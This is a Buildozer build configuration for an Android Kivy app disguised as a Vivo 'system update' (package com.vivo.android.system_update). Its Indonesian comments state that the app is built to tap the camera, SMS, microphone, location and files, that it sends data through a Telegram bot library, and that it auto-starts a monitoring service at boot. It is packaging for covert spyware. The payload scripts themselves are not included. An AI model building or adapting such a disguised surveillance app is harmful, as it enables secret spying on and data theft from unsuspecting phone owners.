[app]
# (str) Title of your application
title = Update System Vivo

# (str) Package name
package.name = system_update

# (str) Package domain (needed for android packaging)
package.domain = com.vivo.android

# (str) Source code where the main.py lives
source.dir = .

# (list) Source files to include (let empty to include all the files)
source.include_exts = py,png,jpg,kv,atlas,json

# (str) Application versioning
version = 1.0

# (list) Application requirements
# Ditambahkan opencv dan telebot untuk fitur kamera & telegram
requirements = python3,kivy,pyTelegramBotAPI,opencv-python,requests,urllib3

# (list) Permissions
# Izin lengkap untuk Sadap Kamera, SMS, Mic, Lokasi, dan File
android.permissions = INTERNET, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, CAMERA, READ_SMS, RECEIVE_SMS, ACCESS_FINE_LOCATION, RECORD_AUDIO, RECEIVE_BOOT_COMPLETED, VIBRATE, WAKE_LOCK

# (int) Target Android API, should be as high as possible.
android.api = 31

# (int) Minimum API your APK will support.
android.minapi = 21

# (str) Android entry point, default is to use start.py
android.entrypoint = main.py

# (list) List of service to declare
# Fitur Auto-Start saat HP nyala
android.services = monitor:service.py

# (bool) Indicate if the application should be fullscreen
fullscreen = 0

# (list) Android additionnal libraries to copy into libs/armeabi
android.archs = arm64-v8a

[buildozer]
# (int) Log level (0 = error only, 1 = info, 2 = debug (with command output))
log_level = 2

# (int) Display warning if buildozer is run as root (0 = off, 1 = on)
warn_on_root = 1
